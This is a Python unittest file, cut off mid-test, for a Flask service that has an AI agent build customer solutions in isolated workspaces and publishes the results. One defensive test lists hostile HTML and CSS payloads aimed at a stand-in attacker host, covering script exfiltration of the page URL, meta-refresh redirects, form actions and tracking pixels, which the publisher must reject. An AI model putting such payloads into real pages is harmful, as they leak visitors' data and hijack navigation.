import io
import hashlib
import json
import os
import shutil
import subprocess
import tempfile
import time
import unittest
import urllib.error
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

from flask import Flask

from mini_frank import (
    MiniFrankRateLedger,
    MiniFrankStorageFence,
    MiniFrankStorageFull,
    RATE_WINDOW_SECONDS,
    RESULT_SCHEMA_V2,
    create_blueprint,
)


class MiniFrankTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        root = Path(self.temp.name)
        self.data_root = root / "data"
        self.project_root = root / "published-mini"
        self.legacy_project_root = root / "legacy-customer-projects"
        self.legacy_project_root.mkdir()
        self.hermes_data_root = root / "hermes-window-data"
        self.runs = []
        self.sessions = []
        self.guide_turns = []
        self.guide_mode = "complete"
        self.guide_reply = "I understand the booking problem. What would a good result change for you?"
        self.fail_next_run = False
        self.fail_session_delete = False
        self.poll_status = "started"
        self.poll_http_status = None
        self.deleted_sessions = []
        self.hermes_calls = []
        self.run_controls = []
        self.block_hermes = False

        def project_getter(project_id):
            if project_id != "mini-frank":
                return None
            return {"id": project_id, "root": project_id, "name": "Mini Frank"}

        def session_creator(project, **kwargs):
            if self.block_hermes:
                time.sleep(1)
                raise TimeoutError("Hermes unavailable")
            session = {
                "id": kwargs.get("session_id_override") or f"session-{len(self.sessions) + 1}"
            }
            self.sessions.append({"project": project, "kwargs": kwargs, "session": session})
            return session

        def hermes_request(path, payload=None, **kwargs):
            if self.block_hermes:
                time.sleep(1)
                raise TimeoutError("Hermes unavailable")
            self.hermes_calls.append({"path": path, "method": kwargs.get("method")})
            if path == "/v1/runs":
                if self.fail_next_run:
                    self.fail_next_run = False
                    raise OSError("Hermes unavailable")
                run = {"run_id": f"run-{len(self.runs) + 1}", "payload": payload, "kwargs": kwargs}
                self.runs.append(run)
                return {"run_id": run["run_id"], "status": "started"}
            if path.startswith("/api/sessions/") and kwargs.get("method") == "DELETE":
                if self.fail_session_delete:
                    raise OSError("Hermes unavailable")
                session_path = path.split("?", 1)[0]
                self.deleted_sessions.append(urllib.parse.unquote(session_path.rsplit("/", 1)[-1]))
                return {"deleted": self.deleted_sessions[-1]}
            if path.startswith("/v1/runs/"):
                if kwargs.get("method") == "POST":
                    self.run_controls.append({"path": path, "payload": payload, "kwargs": kwargs})
                    return {"status": "accepted"}
                if self.poll_http_status:
                    raise urllib.error.HTTPError(path, self.poll_http_status, "not found", None, None)
                return {"run_id": path.rsplit("/", 1)[-1], "status": self.poll_status}
            raise AssertionError(f"unexpected Hermes request: {path}")

        def hermes_chat_stream(session_id, payload, **kwargs):
            self.guide_turns.append({"session_id": session_id, "payload": payload, "kwargs": kwargs})
            reply = self.guide_reply
            if self.guide_mode == "timeout":
                raise TimeoutError("guide stream timed out")
            yield b"event: run.started\n"
            yield b'data: {"type":"run.started","run_id":"private-run-secret"}\n'
            yield b"\n"
            yield b"event: assistant.delta\n"
            yield f"data: {json.dumps({'type': 'assistant.delta', 'delta': reply})}\n".encode()
            yield b"\n"
            yield b"event: reasoning.delta\n"
            yield b'data: {"type":"reasoning.delta","delta":"private chain of thought"}\n'
            yield b"\n"
            if self.guide_mode == "complete":
                yield b"event: assistant.completed\n"
                yield f"data: {json.dumps({'type': 'assistant.completed', 'content': reply})}\n".encode()
                yield b"\n"
            yield b"event: tool.completed\n"
            yield b'data: {"type":"tool.completed","output":"private tool output"}\n'
            yield b"\n"
            yield b"event: done\n"
            yield b'data: {"type":"done"}\n'
            yield b"\n"

        self.project_getter = project_getter
        self.session_creator = session_creator
        self.hermes_request = hermes_request
        self.hermes_chat_stream = hermes_chat_stream
        self.client = self.make_client()

    def make_client(
        self,
        *,
        free_project_limit=20,
        storage_cap_bytes=None,
        storage_min_free_bytes=0,
        max_job_records=None,
        max_intake_records=None,
        max_rate_events=None,
        metadata_headroom_bytes=None,
        max_job_store_bytes=None,
        max_intake_store_bytes=None,
        max_rate_store_bytes=None,
        metadata_write_margin_bytes=None,
    ):
        app = Flask(__name__)
        blueprint_args = dict(
            data_root=self.data_root,
            project_view_root=self.project_root,
            legacy_project_root=self.legacy_project_root,
            project_getter=self.project_getter,
            session_creator=self.session_creator,
            hermes_request=self.hermes_request,
            hermes_chat_stream=self.hermes_chat_stream,
            rate_limit_key="test-rate-limit-key",
            free_project_limit=free_project_limit,
            hermes_data_root=self.hermes_data_root,
            storage_min_free_bytes=storage_min_free_bytes,
        )
        if storage_cap_bytes is not None:
            blueprint_args["storage_cap_bytes"] = storage_cap_bytes
        if max_job_records is not None:
            blueprint_args["max_job_records"] = max_job_records
        if max_intake_records is not None:
            blueprint_args["max_intake_records"] = max_intake_records
        if max_rate_events is not None:
            blueprint_args["max_rate_events"] = max_rate_events
        if metadata_headroom_bytes is not None:
            blueprint_args["metadata_headroom_bytes"] = metadata_headroom_bytes
        if max_job_store_bytes is not None:
            blueprint_args["max_job_store_bytes"] = max_job_store_bytes
        if max_intake_store_bytes is not None:
            blueprint_args["max_intake_store_bytes"] = max_intake_store_bytes
        if max_rate_store_bytes is not None:
            blueprint_args["max_rate_store_bytes"] = max_rate_store_bytes
        if metadata_write_margin_bytes is not None:
            blueprint_args["metadata_write_margin_bytes"] = metadata_write_margin_bytes
        self.blueprint = create_blueprint(**blueprint_args)
        app.register_blueprint(self.blueprint)
        app.testing = True
        return app.test_client()

    def tearDown(self):
        self.temp.cleanup()

    def create_job(self, *, ip="203.0.113.10", **overrides):
        payload = {"problem": "I need customers to book appointments without calling me."}
        payload.update(overrides)
        return self.client.post("/api/mini/jobs", json=payload, headers={"X-Real-IP": ip})

    def create_intake(self, *, ip="203.0.113.30", conversation=None):
        payload = {} if conversation is None else {"conversation": conversation}
        response = self.client.post("/api/mini/intakes", json=payload, headers={"X-Real-IP": ip})
        self.assertEqual(response.status_code, 201)
        return response.get_json()

    @staticmethod
    def claim_headers(created):
        return {"X-Mini-Claim": created["claim_token"]}

    def workspace(self, item_id):
        return self.data_root / "mini-shared" / "workspaces" / item_id

    def replace_with_directory_link(self, path, target):
        shutil.rmtree(path)
        try:
            path.symlink_to(target, target_is_directory=True)
            return
        except OSError as error:
            if os.name != "nt":
                self.skipTest(f"directory symlinks are unavailable: {error}")
        result = subprocess.run(
            ["cmd", "/c", "mklink", "/J", str(path), str(target)],
            capture_output=True,
            text=True,
            check=False,
        )
        if result.returncode:
            self.skipTest(f"directory junctions are unavailable: {result.stderr or result.stdout}")

    def stored_job(self, job_id):
        return json.loads((self.data_root / "mini" / "jobs.json").read_text(encoding="utf-8"))[job_id]

    def reconcile_job(self, job_id):
        jobs_path = self.data_root / "mini" / "jobs.json"
        jobs = json.loads(jobs_path.read_text(encoding="utf-8"))
        if job_id in jobs:
            jobs[job_id]["next_reconcile_at"] = 0
            jobs_path.write_text(json.dumps(jobs), encoding="utf-8")
        self.blueprint.mini_reconcile_once()

    def seed_legacy_job(
        self, job_id, *, hosted_until, created_at=1_700_000_000, session_id=""
    ):
        """Persist the exact retention shape used by the first Mini release."""
        token = f"legacy-claim-{job_id}"
        job = {
            "id": job_id,
            "claim_hash": hashlib.sha256(token.encode("utf-8")).hexdigest(),
            "requester_hash": "legacy-requester",
            "email": "old@example.invalid",
            "problem": "I need customers to book appointments without calling me.",
            "outcome": "Customers can book simply.",
            "people": "A small local business",
            "current_way": "Phone calls",
            "delivery": "free",
            "stage": "ready",
            "created_at": created_at,
            "updated_at": created_at,
            "hosted_until": hosted_until,
            "revision": 1,
            "run_id": "",
            "session_id": session_id,
            "dispatch_error": "",
            "changes": [],
        }
        jobs_path = self.data_root / "mini" / "jobs.json"
        jobs_path.parent.mkdir(parents=True, exist_ok=True)
        jobs_path.write_text(json.dumps({job_id: job}), encoding="utf-8")
        return token

    def write_v2_result(
        self,
        job_id,
        *,
        revision=None,
        result_type="interactive",
        missing=None,
        run_complete=True,
    ):
        job = self.stored_job(job_id)
        revision = int(revision if revision is not None else job["revision"])
        workspace = self.workspace(job_id)
        public = workspace / "public"
        public.mkdir(parents=True, exist_ok=True)
        (public / "build-notes.txt").write_text("Checked the finished files.\n", encoding="utf-8")
        artifacts = []
        if result_type in {"interactive", "combined"}:
            if missing != "index.html":
                (public / "index.html").write_text("<!doctype html><title>Booking helper</title>", encoding="utf-8")
            artifacts.append({
                "kind": "interactive",
                "label": "Open booking helper",
                "url": f"https://preview.frank.fail/mini/{job_id}/",
            })
        if result_type in {"download", "combined"}:
            downloads = public / "downloads"
            downloads.mkdir(exist_ok=True)
            if missing != "booking-plan.pdf":
                (downloads / "booking-plan.pdf").write_bytes(b"%PDF-1.4\nfinished\n%%EOF\n")
            artifacts.append({
                "kind": "download",
                "label": "Download booking plan",
                "url": f"https://preview.frank.fail/mini/{job_id}/downloads/booking-plan.pdf",
                "media_type": "application/pdf",
            })
        manifest = {
            "schema": RESULT_SCHEMA_V2,
            "job_id": job_id,
            "revision": revision,
            "result_type": result_type,
            "title": "Appointment booking solution",
            "summary": "A finished booking solution that is ready to use. It keeps the next step simple for customers.",
            "artifacts": artifacts,
            "details_url": f"https://preview.frank.fail/mini/{job_id}/build-notes.txt",
        }
        (workspace / "result.json").write_text(json.dumps(manifest), encoding="utf-8")
        if run_complete:
            self.poll_status = "completed"
        return workspace, public, manifest

    @staticmethod
    def pdf_bytes(extra=b""):
        return b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n" + extra + b"\n%%EOF\n"

    def test_guide_is_tool_free_sanitizes_stream_and_persists_only_completed_reply(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        response = self.client.post(
            f"/api/mini/intakes/{intake_id}/chat",
            json={"text": "Our bookings are a mess and customers keep calling."},
            headers=headers,
        )
        self.assertEqual(response.status_code, 200)
        body = response.data
        self.assertIn(b"event: assistant.delta", body)
        self.assertIn(b"event: assistant.completed", body)
        self.assertIn(b"event: done", body)
        self.assertNotIn(b"run.started", body)
        self.assertNotIn(b"private-run-secret", body)
        self.assertNotIn(b"reasoning", body)
        self.assertNotIn(b"tool.completed", body)
        self.assertEqual(self.guide_turns[0]["kwargs"]["read_timeout"], 45)

        session = self.sessions[0]
        self.assertEqual(
            session["kwargs"]["session_id_override"], f"mini-intake-{intake_id}"
        )
        self.assertEqual(session["kwargs"]["tool_policy"], "none")
        self.assertEqual(session["kwargs"]["display_workspace_override"], "/workspace")
        self.assertTrue(session["kwargs"]["workspace_override"].endswith(f"/mini-shared/workspaces/{intake_id}"))
        self.assertEqual(session["kwargs"]["memory_scope_override"], f"mini-intake/{intake_id}")
        self.assertNotEqual(session["project"]["id"], "mini-frank")

        intake = self.client.get(f"/api/mini/intakes/{intake_id}", headers=headers).get_json()["intake"]
        self.assertEqual([item["role"] for item in intake["conversation"]], ["user", "assistant"])

    def test_actionable_submit_is_accepted_before_hermes_work_and_reconciles_once(self):
        created = self.create_intake(conversation=[{
            "role": "user",
            "text": "Create meta ads for my small business.",
        }])
        response = self.client.post(
            f"/api/mini/intakes/{created['intake']['id']}/submit",
            json={},
            headers=self.claim_headers(created),
        )
        self.assertEqual(response.status_code, 202)
        body = response.get_json()
        self.assertEqual(body["job"]["stage"], "queued")
        self.assertEqual(self.runs, [])
        self.reconcile_job(body["job"]["id"])
        self.assertEqual(len(self.runs), 1)
        self.assertIn("Create meta ads", self.runs[0]["payload"]["input"])
        self.assertNotIn("Before I build", self.runs[0]["payload"]["input"])

    def test_first_submit_stays_fast_when_hermes_is_blocked(self):
        self.block_hermes = True
        created = self.create_intake(conversation=[{
            "role": "user",
            "text": "Make a simple booking page for my customers.",
        }])
        started = time.perf_counter()
        response = self.client.post(
            f"/api/mini/intakes/{created['intake']['id']}/submit",
            json={},
            headers=self.claim_headers(created),
        )
        elapsed = time.perf_counter() - started

        self.assertEqual(response.status_code, 202)
        self.assertEqual(response.get_json()["job"]["stage"], "queued")
        self.assertEqual(self.sessions, [])
        self.assertEqual(self.runs, [])
        self.assertLess(elapsed, 0.5, f"first submit took {elapsed:.3f}s")

    def test_guide_prompt_allows_only_one_essential_question(self):
        self.guide_reply = "What destination URL should the ads use?"
        created = self.create_intake()
        response = self.client.post(
            f"/api/mini/intakes/{created['intake']['id']}/chat",
            json={"text": "Create a campaign for my business."},
            headers={**self.claim_headers(created), "Idempotency-Key": "guide-essential-1"},
        )
        self.assertEqual(response.status_code, 200)
        response.data
        prompt = self.sessions[0]["kwargs"]["system_prompt_suffix"]
        self.assertIn("at most one short question only", prompt)
        self.assertIn("genuinely impossible", prompt)
        self.assertNotIn("quality-improvement questions", response.data.decode().lower())

    def test_slow_guide_is_saved_and_can_continue_without_retrying_hermes(self):
        self.guide_mode = "timeout"
        created = self.create_intake()
        headers = {**self.claim_headers(created), "Idempotency-Key": "guide-timeout-1"}
        response = self.client.post(
            f"/api/mini/intakes/{created['intake']['id']}/chat",
            json={"text": "Create meta ads for my business."},
            headers=headers,
        )
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"resumable", response.data)
        intake = self.client.get(
            f"/api/mini/intakes/{created['intake']['id']}", headers=self.claim_headers(created)
        ).get_json()["intake"]
        self.assertEqual(intake["guide_status"], "unavailable")
        self.assertTrue(intake["guide_resumable"])
        self.assertEqual(len(self.guide_turns), 1)

        submitted = self.client.post(
            f"/api/mini/intakes/{created['intake']['id']}/submit",
            json={},
            headers=self.claim_headers(created),
        )
        self.assertEqual(submitted.status_code, 202)
        self.assertEqual(submitted.get_json()["job"]["stage"], "queued")

    def test_guide_idempotency_replays_without_a_second_hermes_turn(self):
        created = self.create_intake()
        headers = {**self.claim_headers(created), "Idempotency-Key": "guide-replay-1"}
        first = self.client.post(
            f"/api/mini/intakes/{created['intake']['id']}/chat",
            json={"text": "Create a simple booking helper."}, headers=headers,
        )
        second = self.client.post(
            f"/api/mini/intakes/{created['intake']['id']}/chat",
            json={"text": "Create a simple booking helper."}, headers=headers,
        )
        self.assertEqual(first.status_code, 200)
        self.assertEqual(second.status_code, 200)
        self.assertEqual(len(self.guide_turns), 1)

    def test_customer_generated_responses_do_not_expose_product_owned_name(self):
        created = self.create_intake(conversation=[{
            "role": "user", "text": "Create meta ads for my business.",
        }])
        response = self.client.post(
            f"/api/mini/intakes/{created['intake']['id']}/submit",
            json={}, headers=self.claim_headers(created),
        )
        self.assertNotIn("mini frank", json.dumps(response.get_json()).lower())
        self.reconcile_job(response.get_json()["job"]["id"])
        self.assertNotIn("mini frank", self.runs[0]["payload"]["input"].lower())

    def test_incomplete_guide_reply_is_not_persisted_as_an_assistant_answer(self):
        self.guide_mode = "partial"
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        response = self.client.post(
            f"/api/mini/intakes/{intake_id}/chat",
            json={"text": "Please help with our booking requests."},
            headers=headers,
        )
        self.assertEqual(response.status_code, 200)
        self.assertNotIn(b"assistant.completed", response.data)
        intake = self.client.get(f"/api/mini/intakes/{intake_id}", headers=headers).get_json()["intake"]
        self.assertEqual([item["role"] for item in intake["conversation"]], ["user"])

    def test_build_session_is_an_isolated_terminal_in_a_customer_workspace(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.assertEqual(created["job"]["stage"], "working")
        session = self.sessions[0]
        self.assertEqual(session["kwargs"]["session_id_override"], f"mini-job-{job_id}")
        self.assertEqual(session["kwargs"]["tool_policy"], "isolated_terminal")
        self.assertEqual(session["kwargs"]["display_workspace_override"], "/workspace")
        self.assertTrue(session["kwargs"]["workspace_override"].endswith(f"/mini-shared/workspaces/{job_id}"))
        self.assertEqual(session["kwargs"]["memory_scope_override"], f"mini-job/{job_id}")
        self.assertEqual(session["project"]["id"], f"mini-build-{job_id}")
        self.assertEqual(self.runs[0]["payload"]["session_id"], session["session"]["id"])
        self.assertIn("/workspace/public", self.runs[0]["payload"]["input"])
        self.assertNotIn(str(self.project_root), json.dumps(self.runs[0]["payload"]))

    def test_product_contract_keeps_planning_open_and_offers_paid_additional_projects(self):
        config = self.client.get("/api/mini/config")
        self.assertEqual(config.status_code, 200)
        config_body = config.get_json()
        config_text = json.dumps(config_body).lower()
        self.assertNotIn("email", config_text)
        self.assertNotIn("priority", config_text)
        self.assertTrue(config_body["conversation"]["planning_unmetered"])
        self.assertEqual(config_body["projects"]["additional_projects"], "paid")
        self.assertEqual(config_body["projects"]["free_active"], 20)

        created = self.create_job(email="ignored@example.com").get_json()
        public = created["job"]
        self.assertNotIn("email", json.dumps(public).lower())
        stored = (self.data_root / "mini" / "jobs.json").read_text(encoding="utf-8").lower()
        self.assertNotIn("ignored@example.com", stored)
        self.assertEqual(
            self.client.post(f"/api/mini/jobs/{public['id']}/offer", headers=self.claim_headers(created)).status_code,
            404,
        )

    def test_direct_priority_request_is_rejected_not_silently_downgraded(self):
        response = self.create_job(delivery="priority")
        self.assertEqual(response.status_code, 400)
        self.assertIn("free", response.get_json()["error"].lower())
        self.assertFalse((self.data_root / "mini" / "jobs.json").exists())

    def test_conversation_survives_guidance_submission_and_job_reload(self):
        opening = [{"role": "assistant", "text": "Tell me what is getting in your way."}]
        created = self.create_intake(conversation=opening)
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        guide = self.client.post(
            f"/api/mini/intakes/{intake_id}/chat",
            json={"text": "Customers call because messages get lost."},
            headers=headers,
        )
        self.assertEqual(guide.status_code, 200)
        guide.data
        submitted = self.client.post(f"/api/mini/intakes/{intake_id}/submit", json={}, headers=headers)
        self.assertEqual(submitted.status_code, 202)
        result = submitted.get_json()
        reloaded = self.client.get(
            f"/api/mini/jobs/{result['job']['id']}", headers=self.claim_headers(result)
        ).get_json()["job"]
        self.assertEqual([item["role"] for item in reloaded["conversation"]], ["assistant", "user", "assistant"])
        self.assertIn("Customers call", reloaded["problem"])

    def test_uploaded_customer_files_are_staged_only_in_that_build_workspace(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        conversation = [{"role": "user", "text": "Use this booking brief to solve our appointment problem."}]
        saved = self.client.put(
            f"/api/mini/intakes/{intake_id}/conversation",
            json={"conversation": conversation},
            headers=headers,
        )
        self.assertEqual(saved.status_code, 200)
        uploaded = self.client.post(
            f"/api/mini/intakes/{intake_id}/attachments",
            data={"files": (io.BytesIO(self.pdf_bytes()), "booking-brief.pdf", "application/pdf")},
            headers=headers,
            content_type="multipart/form-data",
        )
        self.assertEqual(uploaded.status_code, 201)
        attachment = uploaded.get_json()["intake"]["attachments"][0]
        submitted = self.client.post(f"/api/mini/intakes/{intake_id}/submit", json={}, headers=headers)
        self.assertEqual(submitted.status_code, 202)
        job_id = submitted.get_json()["job"]["id"]
        self.reconcile_job(job_id)
        staged = self.workspace(job_id) / "private" / "attachments" / f"{attachment['id']}.pdf"
        self.assertEqual(staged.read_bytes(), self.pdf_bytes())
        self.assertFalse(any(path.name == "booking-brief.pdf" for path in self.workspace(job_id).rglob("*")))
        prompt = self.runs[-1]["payload"]["input"]
        self.assertIn(f"/workspace/private/attachments/{attachment['id']}.pdf", prompt)
        self.assertNotIn(str(self.data_root), prompt)

    def test_attachment_alone_can_be_submitted_without_typed_text(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        uploaded = self.client.post(
            f"/api/mini/intakes/{intake_id}/attachments",
            data={"files": (io.BytesIO(self.pdf_bytes()), "please-solve-this.pdf", "application/pdf")},
            headers=headers,
            content_type="multipart/form-data",
        )
        self.assertEqual(uploaded.status_code, 201)

        submitted = self.client.post(f"/api/mini/intakes/{intake_id}/submit", json={}, headers=headers)
        self.assertEqual(submitted.status_code, 202)
        job = submitted.get_json()["job"]
        self.assertEqual(job["attachment_count"], 1)
        self.assertTrue(job["problem"])
        self.assertEqual(job["stage"], "queued")

    def test_valid_v2_result_is_published_as_a_copied_customer_snapshot(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        workspace, public, manifest = self.write_v2_result(job_id, result_type="combined")
        manifest["checks"] = ["The primary action was checked on a narrow screen."]
        manifest["limitations"] = {"offline": "Live provider data is not included."}
        (workspace / "result.json").write_text(json.dumps(manifest), encoding="utf-8")
        self.reconcile_job(job_id)
        response = self.client.get(f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created))
        self.assertEqual(response.status_code, 200)
        job = response.get_json()["job"]
        self.assertEqual(job["stage"], "ready")
        self.assertEqual(job["result"]["revision"], 1)
        self.assertEqual(job["result"]["artifacts"], manifest["artifacts"])
        self.assertEqual(job["result"]["checks"], manifest["checks"])
        self.assertEqual(job["result"]["limitations"], manifest["limitations"])

        projection = self.project_root / job_id
        self.assertEqual((projection / "index.html").read_text(encoding="utf-8"), (public / "index.html").read_text(encoding="utf-8"))
        self.assertEqual((projection / "downloads" / "booking-plan.pdf").read_bytes(), (public / "downloads" / "booking-plan.pdf").read_bytes())
        self.assertTrue((projection / "build-notes.txt").is_file())
        self.assertFalse((projection / "result.json").exists())
        self.assertNotEqual(os.stat(projection / "index.html").st_ino, os.stat(public / "index.html").st_ino)
        self.assertTrue((workspace / "result.json").is_file())

    def test_active_or_navigable_generated_html_is_never_published(self):
        self.client = self.make_client(free_project_limit=20)
        hostile_pages = {
            "script": "<script>location='https://attacker.invalid/?u='+location.href</script>",
            "meta": '<meta http-equiv="refresh" content="0;url=https://attacker.invalid/">',
            "comment-breakout": '<!--><meta http-equiv="refresh" content="0;url=https://attacker.invalid/?job=SECRET">-->',
            "self-link": '<a target="_self" href="https://attacker.invalid/">leave</a>',
            "popup": '<button onclick="open(\'https://attacker.invalid/\')">open</button>',
            "form": '<form action="https://attacker.invalid/"><button>send</button></form>',
            "css": '<style>body{background:url(https://attacker.invalid/pixel)}</style>',
            "css-escaped-function": r'<style>body{background:u\72l(https://attacker.invalid/pixel)}</style>',
            "css-new-image-syntax": '<style>body{background:image-set("https://attacker.invalid/pixel" 1x)}</style>',
        }
        for index, (case, markup) in enumerate(hostile_pages.items(), start=1):
            with self.subTest(case=case):
                created = self.create_job(ip=f"203.0.113.{index}").get_json()
                job_id = created["job"]["id"]
                _, public, _ = self.write_v2_result(job_id)
                (public / "index.html").write_text(
                    f"<!doctype html><title>Unsafe probe</title>{markup}", encoding="utf-8"
                )
                self.reconcile_job(job_id)

                response = self.client.get(
                    f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
                )

                self.assertEqual(response.status_code, 200)
                job = response.get_json()["job"]
                self.assertEqual(job["stage"], "needs_attention")
                self.assertNotIn("result", job)
                self.assertFalse((self.project_root / job_id).exists())

    def test_manifest_is_not_published_until_the_isolated_run_is_terminal(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id, run_complete=False)
        self.reconcile_job(job_id)

        working = self.client.get(
            f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
        ).get_json()["job"]

        self.assertEqual(working["stage"], "working")
        self.assertFalse((self.project_root / job_id).exists())
        self.poll_status = "completed"
        self.reconcile_job(job_id)
        ready = self.client.get(
            f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)
        ).get_json()["job"]
        self.assertEqual(ready["stage"], "ready")

    def test_valid_download_only_result_needs_no_app_or_index_html(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id, result_type="download")
        self.reconcile_job(job_id)
        response = self.client.get(f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created))
        self.assertEqual(response.status_code, 200)
        job = response.get_json()["job"]
        self.assertEqual(job["stage"], "ready")
        self.assertEqual(job["result"]["result_type"], "download")
        self.assertEqual([item["kind"] for item in job["result"]["artifacts"]], ["download"])
        projection = self.project_root / job_id
        self.assertFalse((projection / "index.html").exists())
        self.assertTrue((projection / "downloads" / "booking-plan.pdf").is_file())

    def test_symlink_anywhere_in_public_tree_rejects_the_entire_result(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        _, public, _ = self.write_v2_result(job_id)
        nested = public / "assets"
        nested.mkdir()
        target = nested / "real.txt"
        target.write_text("safe", encoding="utf-8")
        try:
            (nested / "alias.txt").symlink_to(target)
        except OSError as error:
            self.skipTest(f"symlinks are unavailable in this environment: {error}")
        job = self.client.get(f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)).get_json()["job"]
        self.assertNotIn("result", job)
        self.assertNotEqual(job["stage"], "ready")
        self.assertFalse((self.project_root / job_id).exists())

    def test_manifest_with_a_missing_artifact_is_not_published(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id, result_type="download", missing="booking-plan.pdf")
        job = self.client.get(f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)).get_json()["job"]
        self.assertNotIn("result", job)
        self.assertNotEqual(job["stage"], "ready")
        self.assertFalse((self.project_root / job_id).exists())

    def test_revision_change_withdraws_stale_projection_and_archives_manifest(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        workspace, _, _ = self.write_v2_result(job_id)
        self.reconcile_job(job_id)
        ready = self.client.get(f"/api/mini/jobs/{job_id}", headers=self.claim_headers(created)).get_json()["job"]
        self.assertEqual(ready["stage"], "ready")
        self.assertTrue((self.project_root / job_id / "index.html").is_file())

        changed = self.client.post(
            f"/api/mini/jobs/{job_id}/changes",
            json={"change": "Add evening appointment choices."},
            headers=self.claim_headers(created),
        )
        self.assertEqual(changed.status_code, 202)
        changed_job = changed.get_json()["job"]
        self.assertEqual(changed_job["revision"], 2)
        self.assertNotIn("result", changed_job)
        self.assertFalse((self.project_root / job_id).exists())
        self.assertFalse((workspace / "result.json").exists())
        archive = self.data_root / "mini" / "previous-results" / job_id
        self.assertEqual(len(list(archive.glob("result-r1-*.json"))), 1)

    def test_failed_change_dispatch_retries_with_the_persisted_change(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id)
        self.reconcile_job(job_id)
        change = "Add evening appointment choices and a notes field."
        self.fail_next_run = True
        queued = self.client.post(
            f"/api/mini/jobs/{job_id}/changes",
            json={"change": change},
            headers=self.claim_headers(created),
        )
        self.assertEqual(queued.status_code, 202)
        self.assertEqual(queued.get_json()["job"]["stage"], "queued")
        self.assertEqual(self.stored_job(job_id)["pending_change"], change)
        retried = self.client.post(f"/api/mini/jobs/{job_id}/dispatch", headers=self.claim_headers(created))
        self.assertEqual(retried.status_code, 202)
        self.assertEqual(retried.get_json()["job"]["stage"], "working")
        self.assertIn(change, self.runs[-1]["payload"]["input"])

    def test_change_is_rejected_while_the_current_build_is_active(self):
        created = self.create_job().get_json()
        response = self.client.post(
            f"/api/mini/jobs/{created['job']['id']}/changes",
            json={"change": "Add evening appointment choices."},
            headers=self.claim_headers(created),
        )
        self.assertEqual(response.status_code, 409)
        self.assertEqual(created["job"]["revision"], 1)
        self.assertEqual(len(self.runs), 1)

    def test_background_reconcile_publishes_ready_result_without_customer_polling(self):
        created = self.create_job().get_json()
        job_id = created["job"]["id"]
        self.write_v2_result(job_id)
        self.blueprint.mini_reconcile_once()
        stored = self.stored_job(job_id)
        self.assertEqual(stored["stage"], "ready")
        self.assertEqual(stored["published_revision"], 1)
        self.assertTrue((self.project_root / job_id / "index.html").is_file())

    def test_delete_abandons_draft_intake_and_its_private_files_and_workspace(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        uploaded = self.client.post(
            f"/api/mini/intakes/{intake_id}/attachments",
            data={"files": (io.BytesIO(b"private notes\n"), "notes.txt", "text/plain")},
            headers=headers,
            content_type="multipart/form-data",
        )
        self.assertEqual(uploaded.status_code, 201)
        guide = self.client.post(
            f"/api/mini/intakes/{intake_id}/chat",
            json={"text": "Use these notes to understand my booking problem."},
            headers=headers,
        )
        self.assertEqual(guide.status_code, 200)
        guide.data
        attachment_dir = self.data_root / "mini-shared" / "attachments" / intake_id
        workspace = self.workspace(intake_id)
        self.assertTrue(attachment_dir.is_dir())
        self.assertTrue(workspace.is_dir())

        deleted = self.client.delete(f"/api/mini/intakes/{intake_id}", headers=headers)
        self.assertEqual(deleted.status_code, 200)
        self.assertEqual(deleted.get_json(), {"deleted": intake_id})
        self.assertFalse(attachment_dir.exists())
        self.assertFalse(workspace.exists())
        self.assertEqual(self.client.get(f"/api/mini/intakes/{intake_id}", headers=headers).status_code, 404)
        self.assertEqual(self.deleted_sessions, [f"mini-intake-{intake_id}"])

    def test_abandonment_retains_private_data_until_hermes_session_delete_can_retry(self):
        created = self.create_intake()
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        guide = self.client.post(
            f"/api/mini/intakes/{intake_id}/chat",
            json={"text": "I need help with a private booking problem."},
            headers=headers,
        )
        self.assertEqual(guide.status_code, 200)
        guide.data

        self.fail_session_delete = True
        failed = self.client.delete(f"/api/mini/intakes/{intake_id}", headers=headers)
        self.assertEqual(failed.status_code, 500)
        self.assertEqual(self.client.get(f"/api/mini/intakes/{intake_id}", headers=headers).status_code, 404)
        revived = self.client.put(
            f"/api/mini/intakes/{intake_id}/conversation",
            json={"conversation": [{"role": "user", "text": "Revive my expired private draft."}]},
            headers=headers,
        )
        self.assertEqual(revived.status_code, 404)
        stored = json.loads(
            (self.data_root / "mini" / "intakes.json").read_text(encoding="utf-8")
        )[intake_id]
        self.assertEqual(stored["status"], "abandoned_cleanup_pending")

        self.fail_session_delete = False
        self.blueprint.mini_reconcile_once()
        self.assertEqual(
            self.client.get(f"/api/mini/intakes/{intake_id}", headers=headers).status_code,
            404,
        )
        self.assertEqual(self.deleted_sessions, [f"mini-intake-{intake_id}"])

    def test_expired_draft_cleanup_failure_is_tombstoned_and_cannot_refresh_itself(self):
        created = self.create_intake(conversation=[{
            "role": "user",
            "text": "This private draft must disappear after its deadline.",
        }])
        intake_id = created["intake"]["id"]
        headers = self.claim_headers(created)
        stored = json.loads(
